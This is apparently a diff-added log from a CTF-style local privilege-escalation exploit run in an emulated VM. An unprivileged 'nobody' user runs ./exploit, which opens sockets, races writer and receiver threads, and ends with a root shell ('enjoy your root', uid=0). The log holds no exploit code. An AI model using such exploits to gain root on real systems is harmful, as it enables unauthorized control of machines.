@@ -1,0 +1,24 @@
+[+] starting exploit localy...
+c[?7l[2J[0mSeaBIOS (version 1.13.0-1ubuntu1.1)
+Booting from ROM..c[?7l[2Jstarting pid 114, tty '': '/etc/init.d/rcS'
+starting pid 127, tty '/dev/ttyS0': '/controller'
+~ $ id
+uid=65534(nobody) gid=65534 groups=65534
+~ $ ./exploit
+[.] exploit started.
+[+] nirugiri @ 0x402b1a
+[.] creating listening socket @ 49494 ...
+[+] requesting connection
+[.] creating client socket
+[.] creating client socket
+[+] accepting victim connection
+[+] accepting attacker connection and setting hashes
+[+] starting race...
+[+] writer thread started
+[+] receiver thread started
+
+
+[SUCCESS] enjoy your root.
+/ # id
+uid=0(root) gid=0
+/ # 
